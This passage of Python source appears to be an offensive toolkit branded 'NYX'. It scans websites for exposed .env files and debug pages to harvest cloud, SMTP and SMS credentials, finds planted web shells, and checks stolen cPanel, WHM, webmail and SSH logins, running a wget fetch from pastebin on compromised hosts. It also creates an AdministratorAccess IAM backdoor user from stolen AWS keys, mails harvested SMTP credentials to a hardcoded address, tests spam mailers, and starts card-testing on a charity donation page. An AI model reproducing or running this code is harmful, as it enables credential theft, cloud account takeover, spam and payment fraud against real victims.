            msg += fontstyle.apply('\u001b[1m\u001b[42;1m MAILJET \u001b[0m ','bold')
            if not chk:
                Extractor.SV_LAR(maindomain,method,mailjet_creds,'MAILJET.txt')

        if mailgun_creds:
            okkk +=1
            if chk:
                Extractor.print_creds(mailgun_creds)
            msg += fontstyle.apply('\u001b[1m\u001b[42;1m MAILGUN API \u001b[0m ','bold')
            if not chk:
                Extractor.SV_LAR(maindomain,method,mailgun_creds,'MAILGUN.txt')

        if twillio_creds:
            okkk +=1
            if chk:
                Extractor.print_creds(twillio_creds)
            msg += fontstyle.apply('\u001b[1m\u001b[42;1m TWILIO \u001b[0m ','bold')
            if not chk:
                # Extractor.check_twilio(twillio_reformat(twillio_creds))
                Extractor.SV_LAR(maindomain,method,twillio_creds,'TWILIO.txt')

        if sms_creds:
            okkk +=1
            if chk:
                Extractor.print_creds(sms_creds)
            msg += fontstyle.apply('\u001b[1m\u001b[42;1m SMS \u001b[0m ','bold')
            if not chk:
                Extractor.SV_LAR(maindomain,method,sms_creds,'SMS.txt')

        if not okkk:
            msg = fontstyle.apply('[ {}+{} ] {} [ {}Couldn\'t Get Anything{} ] '.format(fg,fw,maindomain,fr,fw),'bold')
        else:
            print()
        print(msg)
        if phpmyadmin_creds:
            if not chk:
                Extractor.extract_emails_from_phpmyadmin(phpmyadmin_creds)

def env(host):
    hub = False
    list_env = ['.env.bak', '.env', 'env.js','config.env', '.env.dist', '.env.dev', '.env.local', 'public/.env', 'laravel/.env', 'laravel/core/.env', 'beta/.env', 'kyc/.env', 'admin/.env', 'prod/.env', '.env.backup', '.env.docker.dev', '.env.php', '.env.prod', '.env.production.local', '.env.sample.php', '.env.save', '.env.stage', '.env.test', '.env.test.local', '.env.local', '.env.production', '.env.staging', 'backup/.env', 'backup/.env.local', 'backup/.env.production', 'backup/.env.staging', 'public/.env', 'public/.env.local', 'public/.env.production', 'public/.env.staging', 'laravel/.env', 'laravel/.env.local', 'laravel/.env.production', 'laravel/.env.staging', 'laravel/core/.env', 'laravel/core/.env.local', 'laravel/core/.env.production', 'laravel/core/.env.staging', 'beta/.env', 'beta/.env.local', 'beta/.env.production', 'beta/.env.staging',  'live/.env', 'live/.env.local', 'live/.env.production', 'live/.env.staging', 'demo/.env', 'demo/.env.local', 'demo/.env.production', 'demo/.env.staging', 'test/.env', 'test/.env.local', 'test/.env.production', 'test/.env.staging', 'kyc/.env',  'kyc/.env.local', 'kyc/.env.production', 'kyc/.env.staging',  'admin/.env', 'admin/.env.local',  'admin/.env.production',  'admin/.env.staging',  'client/.env', 'client/.env.local', 'client/.env.production', 'client/.env.staging', 'user/.env', 'user/.env.local', 'user/.env.staging', 'api/.env',  'api/.env.local', 'api/.env.staging', 'api/.env.production', 'apis/.env', 'apis/.env.local', 'apis/.env.staging', 'apis/.env.production', 'backend/.env', 'backend/.env.local', 'backend/.env.staging', 'backend/.env.production', 'server/.env', 'server/.env.local', 'server/.env.staging', 'server/.env.production', 'app/.env', 'app/.env.local', 'app/.env.staging', 'app/.env.production', 'project/.env', 'project/.env.local', 'project/.env.staging', 'project/.env.production', 'cron/.env', 'cron/.env.local', 'cron/.env.staging', 'cron/.env.production', 'crm/.env', 'crm/.env.local', 'crm/.env.staging', 'crm/.env.production', 'current/.env', 'current/.env.local', 'current/.env.staging', 'current/.env.production', 'dev/.env', 'dev/.env.local', 'dev/.env.staging', 'dev/.env.production', 'develop/.env', 'develop/.env.local', 'develop/.env.staging', 'develop/.env.production', 'development/.env', 'development/.env.local', 'development/.env.staging', 'development/.env.production', 'prod/.env',  'prod/.env.local', 'prod/.env.staging', 'prod/.env.production', 'product/.env', 'product/.env.local', 'product/.env.staging', 'product/.env.production', 'production/.env', 'production/.env.local', 'production/.env.staging', 'production/.env.production', 'portal/.env', 'portal/.env.local', 'portal/.env.staging', 'portal/.env.production', 'qa/.env', 'qa/.env.local', 'qa/.env.staging', 'qa/.env.production', 'stg/.env', 'stg/.env.local', 'stg/.env.staging', 'stg/.env.production', 'staging/.env', 'staging/.env.local', 'staging/.env.staging', 'staging/.env.production', 'service/.env', 'service/.env.local', 'service/.env.staging', 'service/.env.production', 'services/.env', 'services/.env.local', 'services/.env.staging', 'services/.env.production', 'storage/.env', 'storage/.env.local', 'storage/.env.staging', 'storage/.env.production', 'old/.env', 'old/.env.local', 'old/.env.staging', 'old/.env.production', 'new/.env', 'new/.env.local', 'new/.env.staging', 'new/.env.production', 'web/.env', 'web/.env.local', 'web/.env.staging', 'web/.env.production', 'website/.env', 'website/.env.local', 'website/.env.staging', 'website/.env.production', 'market/.env', 'market/.env.local', 'market/.env.staging', 'market/.env.production', 'marketing/.env', 'marketing/.env.local', 'marketing/.env.staging', 'marketing/.env.production', 'shop/.env', 'shop/.env.local', 'shop/.env.staging', 'shop/.env.production', 'public_html/.env', 'public_html/.env.local', 'public_html/.env.staging', 'public_html/.env.production', 'xampp/.env', 'xampp/.env.local', 'xampp/.env.staging', 'xampp/.env.production','api/.env', '.docker/.env',  '.docker/laravel/app/.env', 'env.backup', '.environment', '.envrc', '.envs', '.env~', '.gitlab-ci/.env', '.vscode/.env', 'mailer/.env', 'twitter/.env', '.env.development.local']
    for path in list_env:
        try:
            url = rebuild_url(host , path)
            resp = requests.get(url,headers=headers,timeout=8,verify=False).text
            if not('APP_KEY' in str(resp) or 'APP_ENV' in resp  or 'aws' in str(resp).lower()):
                resp = requests.get(url.replace('http://','https://'),headers=headers,timeout=8,verify=False,allow_redirects=False).text
                if not('APP_KEY' in str(resp) or 'APP_ENV' in resp  or 'aws' in str(resp).lower()):
                    resp = ''
            if 'APP_KEY' in resp  or 'APP_ENV' in resp or 'AWS_'.lower() in str(resp).lower():
                if not 'exception' in str(resp).lower() and 'const ' not in str(resp):
                    resp = reformat_text_env(resp)
                elif 'const ' in str(resp):
                    resp = reformat_envjs(resp)
                else:
                    resp = reformat_text_Exception(resp)
                Extractor.init(url , resp , path)
                hub = True
                break
        except:
            print(fontstyle.apply('[ {}-{} ] {} [ {}{}{} ]'.format(fr,fw,host,fr,path,fw),'bold'))
    return hub

def debug(host):
    try:
        resp = requests.post(host, data={1: 1}, timeout=10, verify=False).text
        if not('APP_KEY' in str(resp) or 'APP_ENV' in resp  or 'aws' in str(resp).lower()):
            host = str(host).replace('http://','https://')
            resp = requests.post(host, data={1: 1}, timeout=10, verify=False).text
            if not('APP_KEY' in str(resp) or 'APP_ENV' in resp  or 'aws' in str(resp).lower()):
                resp = ''
        if 'APP_KEY' in resp  or 'APP_ENV' in resp or 'AWS_'.lower() in str(resp).lower():
            if not 'exception' in str(resp).lower() and 'const ' not in str(resp):
                resp = debugfixer(resp)
            elif 'const ' in str(resp):
                resp = reformat_envjs(resp)
            else:
                resp = reformat_text_Exception(resp)
            Extractor.init(host , resp , 'Debug')
            return True
        print(fontstyle.apply('[ {}-{} ] {} [ {}{}{} ]'.format(fr,fw,host,fr,'Debug',fw),'bold'))
        return False
    except:
        return False

def laravel_scanner(host):
    if not os.path.isdir('Results'):
        os.mkdir('Results')
    if not str(host).startswith('http'):
        host = 'http://' + str(host)
    if not env(host):
        if not debug(host):
            print(fontstyle.apply('[ {}-{} ] {} [ {}Couldn\'t Find Anything{} ]'.format(fr,fw,host,fr,fw),'bold'))

def laravel_main():
    lista = list(x.strip() for x in open(input('{}[{}+{}] List : '.format(fw,fg,fw)),'r',errors='ignore').readlines())
    try:
        ThreadPoolExecutor(100).map(laravel_scanner,lista)
    except Exception as e:
        print(e)
        pass

# SCANNERS ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

async def check_v2(url_testes):
    global VALID, BAD, CHECKED
    found_shell = 0
    url = str(url_testes).lower()
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url
    async with semaphore:
        for exploit in NYX:
            name = str(exploit['name'])
            if not name.startswith('/'):
                name = '/' + name
            urlx = url + name
            async with aiohttp.ClientSession() as session:
                try:
                    async with session.get(urlx, headers=headers, timeout=12) as resp:
                        req = await resp.text()
                        if any(x in str(req).lower() for x in ['forbidden', 'title>404', 'title>not acceptable']):
                            urlx = urlx.replace('http://', 'https://')
                            async with session.get(urlx, headers=headers, timeout=12) as resp:
                                req = await resp.text()
                                if any(x in str(req).lower() for x in ['forbidden', 'title>404', 'title>not acceptable']):
                                    req = ''
                except:
                    req = ''
            if req:
                count = sum(1 for i in exploit['keywords'] if str(i).lower() in req.lower())
                if count == len(exploit['keywords']):
                    print(f"{fw}[ {fg}+{fw} ] [ {fg}VULN{fw} ] {url_testes}")
                    with open('vuln.txt', 'a', errors='ignore') as f:
                        f.write(urlx + '\n')
                    found_shell += 1
                    break
        if found_shell:
            VALID += 1
        else:
            print(f"{fw}[ {fr}-{fw} ] [ {fr}FAIL{fw} ] {url_testes}")
            BAD += 1
        CHECKED += 1
        if os.name == 'nt':
            os.system("title " + "[NYX] SHELL FINDER V2 [{}/{}] - SHELLS : {} - BAD : {}".format(CHECKED,TOTAL,VALID,BAD))

async def start_v2():
    tasks = []
    for url in lista:
        tasks.append(asyncio.ensure_future(check_v2(url)))
    await asyncio.gather(*tasks)
    return

def ShellFinderv2():
    global lista , TOTAL
    lista = list(x.strip() for x in open(input('{}[{}!{}]{} List : '.format(flc,fr,flc,fw)),'r',errors='ignore').readlines())
    lista = [*set(lista)]
    TOTAL = int(len(lista))
    os.system('cls')
    print('\n')
    print('{}[{}INFO{}] Loaded {}{}{} domains!'.format(fw,fg,fw,fr,TOTAL,fw))
    os.system("title " + "[NYX] SHELL FINDER V2 [{}/{}] - SHELLS : {} - BAD : {}".format(CHECKED,TOTAL,VALID,BAD))
    print('\n')
    asyncio.run(start_v2())

# CHECKERS ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

def login_ssh(string):
    print(string)
    host , username , password = str(string).split('|',2)
    cnx = False
    upload = False
    try:
        client = paramiko.client.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=username, password=password)
        cnx = True
        _stdin, _stdout,_stderr = client.exec_command('ls')
        res = _stdout.read().decode()
        if 'Invalid argument' not in str(res):
            _stdin, _stdout,_stderr = client.exec_command("wget https://pastebin.com/raw/ErYsJ0Km -O nyx.txt")
            _stdin, _stdout,_stderr = client.exec_command('ls')
            res = _stdout.read().decode()
            if 'nyx.txt' in str(res):
                upload = True
                _stdin, _stdout,_stderr = client.exec_command('rm nyx.txt')
            if cnx and upload:
                open('SSH_Success.txt','a',errors='ignore').write('{}|{}|{}'.format(host,username,password) + '\n')
                print('{}[ SUCCESS ]{} {}'.format(fg,fw,host))
                return True
            elif cnx and not upload:
                print('{}[ BAD ]{} {}'.format(fr,fw,host))
                return False
            client.close()
        else:
            print('{}[ BAD ]{} {}'.format(fr,fw,host))
            return False
    except:
        print('{}[ BAD ]{} {}'.format(fr,fw,host))
        return False
    return False

def checkcpanel(string):
    try:
        string = str(string).split('|')
        link = str(string[0]).strip()
        user = str(string[1]).strip()
        pwd = str(string[2]).strip()
        if 'http' not in str(link):
            link = 'http://' + str(link)
        if ':2082' not in str(link) and ':2083' not in str(link):
            link = str(link) + ':2083'
        try:
            req = requests.get(link , headers=headers , timeout = 5)
            if 'cpanel</title' in str(req.text).lower() or 'title>cpanel' in str(req.text).lower():
                if str(req.url) != str(link):
                    link = str(req.url)
            payload = {
                'user': '{}'.format(user),
                'pass': '{}'.format(pwd),
                'goto_uri': '/'
            }
            login = requests.post(link + '/login/?login_only=1' , headers = headers ,data = payload, timeout = 8).text
            string = '{}|{}|{}'.format(link,user,pwd)
            if 'security_token' in str(login):
                print('\u001b[42;1mSUCCESS\u001b[0m {}'.format(string))
                open('cPanel_success.txt','a',errors='ignore').write(string + '\n')
            else:
                print('\u001b[41;1mWRONG CREDS\u001b[0m {}'.format(string))
        except:
            string = '{}|{}|{}'.format(link,user,pwd)
            print('\u001b[41;1mERROR\u001b[0m {}'.format(string))
    except:
        pass

def checkwhm(string):
    try:
        string = str(string).split('|')
        link = str(string[0]).strip()
        user = str(string[1]).strip()
        pwd = str(string[2]).strip()
        if 'http' not in str(link):
            link = 'http://' + str(link)
        if ':2086' not in str(link) and ':2087' not in str(link):
            link = str(link) + ':2087'
        try:
            req = requests.get(link , headers=headers , timeout = 5)
            if 'whm</title' in str(req.text).lower() or 'title>whm' in str(req.text).lower():
                if str(req.url) != str(link):
                    link = str(req.url)
            payload = {
                'user': '{}'.format(user),
                'pass': '{}'.format(pwd),
                'goto_uri': '/'
            }
            login = requests.post(link + '/login/?login_only=1' , headers = headers ,data = payload, timeout = 8).text
            string = '{}|{}|{}'.format(link,user,pwd)
            if 'security_token' in str(login):
                print('\u001b[42;1mSUCCESS\u001b[0m {}'.format(string))
                open('WHM_success.txt','a',errors='ignore').write(string + '\n')
            else:
                print('\u001b[41;1mWRONG CREDS\u001b[0m {}'.format(string))
        except:
            string = '{}|{}|{}'.format(link,user,pwd)
            print('\u001b[41;1mERROR\u001b[0m {}'.format(string))
    except:
        pass

def checkwebmail(string):
    try:
        string = str(string).split('|')
        user = str(string[0]).strip()
        pwd = str(string[1]).strip()
        link = str(user).split('@')[1]
        if 'http' not in str(link):
            link = 'http://' + str(link)
        if ':2095' not in str(link) and ':2096' not in str(link):
            link = str(link) + ':2096'
        try:
            req = requests.get(link , headers=headers , timeout = 5)
            if 'webmail</title' in str(req.text).lower() or 'title>webmail' in str(req.text).lower():
                if str(req.url) != str(link):
                    link = str(req.url)
            payload = {
                'user': '{}'.format(user),
                'pass': '{}'.format(pwd),
                'goto_uri': '/'
            }
            login = requests.post(link + '/login/?login_only=1' , headers = headers ,data = payload, timeout = 8).text
            string = '{}|{}|{}'.format(link,user,pwd)
            print(login)
            if 'security_token' in str(login):
                print('\u001b[42;1mSUCCESS\u001b[0m {}'.format(string))
                open('WebMail_success.txt','a',errors='ignore').write(string + '\n')
            else:
                print('\u001b[41;1mWRONG CREDS\u001b[0m {}'.format(string))
        except:
            string = '{}|{}|{}'.format(link,user,pwd)
            print('\u001b[41;1mERROR\u001b[0m {}'.format(string))
    except:
        try:
            string = str(string).split('|')
            link = str(string[0]).strip()
            user = str(string[1]).strip()
            pwd = str(string[2]).strip()
            if 'http' not in str(link):
                link = 'http://' + str(link)
            if ':2095' not in str(link) and ':2096' not in str(link):
                link = str(link) + ':2096'
            try:
                req = requests.get(link , headers=headers , timeout = 5)
                if 'webmail</title' in str(req.text).lower() or 'title>webmail' in str(req.text).lower():
                    if str(req.url) != str(link):
                        link = str(req.url)
                payload = {
                    'user': '{}'.format(user),
                    'pass': '{}'.format(pwd),
                    'goto_uri': '/'
                }
                login = requests.post(link + '/login/?login_only=1' , headers = headers ,data = payload, timeout = 8).text
                string = '{}|{}|{}'.format(link,user,pwd)
                print(login)
                if 'security_token' in str(login):
                    print('\u001b[42;1mSUCCESS\u001b[0m {}'.format(string))
                    open('WebMail_success.txt','a',errors='ignore').write(string + '\n')
                else:
                    print('\u001b[41;1mWRONG CREDS\u001b[0m {}'.format(string))
            except:
                string = '{}|{}|{}'.format(link,user,pwd)
                print('\u001b[41;1mERROR\u001b[0m {}'.format(string))
        except:
            pass

def createuser_aws(ACCESS_KEY,ACCESS_SECRET,AWS_REGION):
    try:
        panel_user = 'Nyx_FallagaTn'
        panel_pwd = 'Fyraszx232@@'
        iam = boto3.client('iam', aws_access_key_id=ACCESS_KEY,aws_secret_access_key=ACCESS_SECRET,region_name=AWS_REGION)
        created_user = iam.create_user(UserName=panel_user)
        if created_user['User']['UserName']:
            asu = created_user['User']['Arn'].split(':')
            response = iam.attach_user_policy(UserName = panel_user, PolicyArn = 'arn:aws:iam::aws:policy/AdministratorAccess')
            asus = iam.create_login_profile(UserName=panel_user, Password=panel_pwd)
            open('login.txt', 'a').write('STATUS        : CAN CREATE USER\nACCOUNT ID    : '+str(asu[4])+'\nIAM USERNAME  : '+str(created_user['User']['UserName'])+'\nPASSWORD      : '+str(panel_pwd)+'\n\n')
    except:
        pass
    return

def othersss(smtp):
    HOST, PORT, usr, pas , sendr = smtp.strip().split('|')
    try:
        server = smtplib.SMTP(HOST, PORT)
        server.ehlo()
        server.starttls()
        server.login(usr, pas)
        msg = MIMEMultipart()
        msg['Subject'] = "test"
        msg['From'] = sendr
        msg['To'] = 'fyraszx232@yahoo.com'
        msg.add_header('Content-Type', 'text/html')
        data = """SMTP VALID by @Nyx_FallagaTn
{}|{}|{}|{}|{}
""".format(HOST, PORT, usr,pas,sendr)
        msg.attach(MIMEText(data, 'html', 'utf-8'))
        server.sendmail(usr, [msg['To']], msg.as_string())
        return True
    except:
        nyx = ''
    return False

def check_aws_smtp(smtp):
    HOST, PORT, usr, pas , sendr = smtp.strip().split('|')
    try:
        server = smtplib.SMTP(HOST, PORT)
        server.ehlo()
        server.starttls()
        server.login(usr, pas)
        msg = MIMEMultipart()
        msg['Subject'] = "test"
        msg['From'] = sendr
        msg['To'] = 'fyraszx232@yahoo.com'
        msg.add_header('Content-Type', 'text/html')
        data = """SMTP VALID by @Nyx_FallagaTn
{}|{}|{}|{}|{}
""".format(HOST, PORT, usr,pas,sendr)
        msg.attach(MIMEText(data, 'html', 'utf-8'))
        server.sendmail(usr, [msg['To']], msg.as_string())
        return True
    except:
        if othersss(smtp):
            return True
    return False

def aws_checker(inp):
    x = str(inp).split('|',2)
    regions = [
        'us-east-1',
        'us-east-2',
        'us-west-1',
        'us-west-2',
        'eu-west-1',
        'eu-west-2',
        'eu-west-3',
        'eu-central-1',
        'eu-north-1',
        'ap-southeast-1',
        'ap-southeast-2',
        'ap-northeast-1',
        'ap-northeast-2',
        'sa-east-1',
        'ca-central-1',
        'ap-south-1',
        'me-south-1',
        'af-south-1'
        ]
    try:
        AWS_ACCESS_KEY = x[0]
    except:
        AWS_ACCESS_KEY = ''
    try:
        AWS_SECRET_KEY = x[1]
    except:
        AWS_SECRET_KEY = ''
    for AWS_REGION in regions:
        if AWS_ACCESS_KEY != '' and AWS_SECRET_KEY != '':
            createuser_aws(AWS_ACCESS_KEY,AWS_SECRET_KEY,AWS_REGION)
            try:
                client = boto3.client('ses',region_name=AWS_REGION,aws_access_key_id=AWS_ACCESS_KEY,aws_secret_access_key=AWS_SECRET_KEY)
                asu = client.get_send_quota()
                y = json.dumps(asu)
                x = json.loads(y)
                if 'Max24HourSend' in x:
                    limit = x['Max24HourSend']
                    response = client.list_identities(
                        IdentityType='EmailAddress',
                        MaxItems=123,
                        NextToken='',
                        )
                    senders = response['Identities']
                    print(fontstyle.apply('[ ','bold') + fontstyle.apply('LIVE','bold/italic/green') + fontstyle.apply(' ]','bold') + fontstyle.apply(' {}|{}|{} [ LIMIT : {}{}{}]'.format(AWS_ACCESS_KEY,AWS_SECRET_KEY,AWS_REGION,fg,limit,fw),'bold'))
                    rez = '{}|{}|{} (LIMIT:{})'.format(AWS_ACCESS_KEY,AWS_SECRET_KEY,AWS_REGION,limit)
                    open('AWS_KEY_LIVE.txt','a',errors='ignore').write(rez + '\n')
                    for sender in senders:
                        smtp = 'email-smtp.'+AWS_REGION+'.amazonaws.com|587|{}|{}|{}'.format(AWS_ACCESS_KEY,AWS_SECRET_KEY,sender)
                        if check_aws_smtp(smtp):
                            print('[{}INFO{}] {} [ {}SEND TEST!{} ]'.format(fg,fw,smtp,fg,fw))
                            open('AWS_SMTP_WORK.txt','a',errors='ignore').write(smtp + '\n')
                else:
                    print(fontstyle.apply('[ ','bold') + fontstyle.apply('DEAD','bold/italic/red') + fontstyle.apply(' ]','bold') + fontstyle.apply(' {}|{}|{}'.format(AWS_ACCESS_KEY,AWS_SECRET_KEY,AWS_REGION),'bold'))
            except:
                print(fontstyle.apply('[ ','bold') + fontstyle.apply('DEAD','bold/italic/red') + fontstyle.apply(' ]','bold') + fontstyle.apply(' {}|{}|{}'.format(AWS_ACCESS_KEY,AWS_SECRET_KEY,AWS_REGION),'bold'))

def URLdomain(url):
    if 'http://' not in str(url) and 'https://' not in str(url):
        url = 'http://' + url
    else:
        url = str(url).replace('https://','http://').replace('www.','')
    if url[-1] =='/':url = url[:-1]
    return url

def chkport80(url):
    urlx = URLdomain(url)
    try:
        req = requests.get(urlx , headers = headers , timeout = 5).status_code
    except:
        req = ''
    try:
        urlx = str(urlx).replace('http://','https://')
        req2 = requests.get(urlx , headers = headers , timeout = 5).status_code
    except:
        req2 =''
    if req == 200 or req2 == 200:
        print('{}[ {}+{} ] {} [ {}LIVE{} ]'.format(fw,fg,fw,urlx,fg,fw))
        open('live_ips.txt','a',errors='ignore').write( url + '\n')
    else:
        print('{}[ {}-{} ] {} [ {}BAD{} ]'.format(fw,fr,fw,urlx,fr,fw))

def inboxgen():
    global urlcheckinbox, inbox , MAILSUB
    l = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    MAILSUB = ''
    for i in range(0, 10):
        MAILSUB += ''.join(random.choice(l))
    urlcheckinbox = 'https://tempmail.plus/en?{}@mailto.plus'.format(MAILSUB)
    inbox = urlcheckinbox.split('en?')[1]
    return MAILSUB

def checkinbox(xs):
    messages = []
    try:
        req = requests.get('https://tempmail.plus/api/mails?email={}%40mailto.plus&limit=100'.format(MAILSUB)).text
        mailids = reg('"mail_id":(.*?),',req)
        for i in mailids:
            req = requests.get('https://tempmail.plus/api/mails/{}?email={}%40mailto.plus'.format(i,MAILSUB)).content
            mailer = reg('Working Mailer : (.*?)","',str(req))[0]
            mailer = str(mailer).replace('\\n','').replace('\\','')
            messages.append(mailer)
        if str(xs) in messages:
            return True
        else:
            return False
    except:
        return False

def mailertester(url):
    inboxgen()
    sendtest = requests.get(url,headers=headers2,verify=False,timeout=10).text
    sendermail = reg('name="senderEmail" value="(.*?)">', sendtest)[0]
    if MAILSUB != '': 
        data = {
            'action': 'score',
            'senderEmail': f'{sendermail}',
            'senderName': '',
            'attachment[]': '(binary)',
            'replyTo': '',
            'subject': '',
            'messageLetter': 'Working Mailer : {}'.format(url),
            'emailList': '{}'.format(inbox),
            'messageType': '1',
            'charset': 'UTF-8',
            'encode': '8bit',
            'action': 'send'
            }
    else: 
        data = {
            'action': 'score',
            'senderEmail': f'{sendermail}',
            'senderName': '',
            'attachment[]': '(binary)',
            'replyTo': '',
            'subject': '',
            'messageLetter': 'Working Mailer : {}'.format(url),
            'emailList': '{}'.format(inbox),
            'messageType': '1',
            'charset': 'UTF-8',
            'encode': '8bit',
            'action': 'send'
            }
    try:
        reqsend = requests.post(url,headers=headers2,data=data,verify=False).text
        if '<span class="label label-success">Ok</span>' in str(reqsend):
            time.sleep(2)
            if checkinbox(url):
                print('{}[{}+{}] {} [{}MAILER{}] [{}WORKING{}|{}DELIVER{}]'.format(fw,fg,fw,url,fg,fw,fg,fw,fg,fw))
                open('mailer_D.txt','a',errors='ignore').write(url + '\n')
            else:
                print('{}[{}+{}] {} [{}MAILER{}] [{}WORKING{}|{}DELIVER{}]'.format(fw,fg,fw,url,fg,fw,fg,fw,fr,fw))
                open('mailer_W.txt','a',errors='ignore').write(url + '\n')
        else:
            print('{}[{}+{}] {} [{}MAILER{}] [{}WORKING{}|{}DELIVER{}]'.format(fw,fg,fw,url,fg,fw,fr,fw,fr,fw))
            open('mailer.txt','a',errors='ignore').write(url + '\n')
    except:
        pass

def check_smtp_deliver(smtp):
    HOST, PORT, usr, pas = smtp.strip().split('|')
    global VALIDS, INVALIDS
    try:
        server = smtplib.SMTP(HOST, PORT)
        server.ehlo()
        server.starttls()
        server.login(usr, pas)
        msg = MIMEMultipart()
        msg['Subject'] = "test"
        msg['From'] = usr
        msg['To'] = toaddr
        msg.add_header('Content-Type', 'text/html')
        data = """SMTP VALID by @Nyx_FallagaTn
{}|{}|{}|{}
""".format(HOST, PORT, usr,pas)
        msg.attach(MIMEText(data, 'html', 'utf-8'))
        server.sendmail(usr, [msg['To']], msg.as_string())
        print('\033[92m' + '[+] [ SUCCESS ] {} '.format(HOST) + '\033[0m')
        open('validsmtp.txt', 'a').write(smtp + "\n")
        VALIDS += 1
        os.system("title " + "[+] SMTP WORKED - VALIDS : {} , INVALIDS : {} .".format(VALIDS, INVALIDS))
    except:
        other_smtp_check(smtp)

def other_smtp_check(smtp):
    HOST, PORT, usr, pas = smtp.strip().split('|')
    global VALIDS, INVALIDS
    try:
        server = smtplib.SMTP(HOST, PORT)
        server.ehlo()
        #server.starttls()
        server.login(usr, pas)
        msg = MIMEMultipart()
        msg['Subject'] = "test"
        msg['From'] = usr
        msg['To'] = toaddr
        msg.add_header('Content-Type', 'text/html')
        data = """SMTP VALID by @Nyx_FallagaTn
{}|{}|{}|{}
""".format(HOST, PORT, usr,pas)
        msg.attach(MIMEText(data, 'html', 'utf-8'))
        server.sendmail(usr, [msg['To']], msg.as_string())
        print('\033[92m' + '[+] [ SUCCESS ] {} '.format(HOST) + '\033[0m')
        open('validsmtp.txt', 'a').write(smtp + "\n")
        VALIDS += 1
        os.system("title " + "[+] SMTP WORKED - VALIDS : {} , INVALIDS : {} .".format(VALIDS, INVALIDS))
    except:
        INVALIDS += 1
        print('\033[91m' + '[-] [ FAIL ] {} '.format(smtp) + '\033[0m')
    return

def SMTPTESTER():
    global toaddr
    toaddr = input('[{}#{}] Your Email : '.format(fg,fw))
    SMTPS = open(input('{}[{}!{}]{} SMTPS list : '.format(flc,fr,flc,fw)), 'r').read().splitlines()
    try:
        ThreadPoolExecutor(10).map(check_smtp_deliver, SMTPS)
    except Exception as e:
        print("Finished, success , Thank you for using.")

def aws_checker_main():
    lista = open(input('{}[{}!{}]{} List : '.format(flc,fr,flc,fw)), 'r').read().splitlines()
    for creds in lista:
        aws_checker(creds)

def check_ssh():
    lista = open(input('{}[{}!{}]{} List : '.format(flc,fr,flc,fw)), 'r').read().splitlines()
    try:
        ThreadPoolExecutor(10).map(login_ssh ,lista)
    except:
        pass

def cpanel():
    lista = list(x.strip() for x in open(input('{}[{}!{}] List : '.format(fw,fr,fw)),'r',errors='ignore').readlines())
    try:
        ThreadPoolExecutor(100).map(checkcpanel,lista)
    except:
        pass

def whm():
    lista = list(x.strip() for x in open(input('{}[{}!{}] List : '.format(fw,fr,fw)),'r',errors='ignore').readlines())
    try:
        ThreadPoolExecutor(100).map(checkwhm,lista)
    except:
        pass

def webmail():
    lista = list(x.strip() for x in open(input('{}[{}!{}] List : '.format(fw,fr,fw)),'r',errors='ignore').readlines())
    try:
        ThreadPoolExecutor(100).map(checkwebmail,lista)
    except:
        pass

def call_chk80_443():
    lista = open(input('{}[{}!{}]{} List : '.format(flc,fr,flc,fw)), 'r').read().splitlines()
    try:
        with ThreadPoolExecutor(300) as executor:
            executor.map(chkport80, lista)
    except Exception as e:
        print(e)

def MT():
    os.system('cls')
    logo()
    lista = list(x.strip() for x in open(input('{}[{}!{}]{} List : '.format(flc,fr,flc,fw)),'r',errors='ignore').readlines()) 
    try:
        ThreadPoolExecutor(100).map(mailertester,lista)
    except:
        pass

def bouncechekcer(email):
    headers = {
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': str(generate_user_agent()),
        'Connection': 'close',
        'Host': 'odc.officeapps.live.com',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': 'https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0',
        'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
        'canary': 'BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKz',
        'uaid': str(uuid4()),
        'Cookie': 'xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354'
    }

    response = requests.request("POST", "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + str(email) + "&_=1604288577990", data=False, headers=headers)
    
    if str('Neither') in str(response.text):
        with open('DIE-EMAIL.txt', 'a') as em:
            em.write(email + '\n')
        print(" \033[31;1mDIE\033[0m  | " + email + " | [ \033[31;1m INVALID \033[0m ]")
    elif str('MSAccount') in str(response.text):
        with open('LIVE-EMAIL.txt', 'a') as em:
            em.write(email + '\n')
        print(" \033[32;1mLIVE\033[0m | " + email + " | [ \033[32;1m VALID \033[0m ]")
    else:
        with open('LIVE-EMAIL.txt', 'a') as em:
            em.write(email + '\n')
        print(" \033[32;1mLIVE\033[0m | " + email + f" | [ \033[34;1m {response.text} \033[0m ]")

def bouncemain():
    email_list = input("Enter Email List > ")
    with open(email_list, 'r') as listx:
        email_list = listx.read().splitlines()

    with ThreadPoolExecutor(max_workers=10) as executor:
        for email in email_list:
            if email == '':
                continue
            else:
                email = email.strip()
                executor.submit(bouncechekcer, email)

    print('Done checking', len(email_list), 'emails')

def checkercc(carta):
    try:
        cc, exp, cvv = str(carta).split('|', 2)
        e = 'fyraszx232@yahoo.com'
        fn = 'david'
        ln = 'shalom'
        amount = '5'
        phone = '46578298'

        options = Options()
        options.headless = True

        driver = webdriver.Firefox(options=options)
        driver.get("https://donate.wfp.org/1243/donation/regular/?campaign=1517")
        driver.find_element(By.XPATH, '//*[@id="formulate--1243-donation-regular--42"]').send_keys(amount)
        time.sleep(1)
        driver.find_element(By.NAME, 'email').send_keys(e)
        time.sleep(1)
        driver.find_element(By.XPATH, '/html/body/div[1]/div/div/main/div/div/div/div/form/div[26]/div/div/div/div/div[7]/div/input').send_keys(phone)
        time.sleep(1)
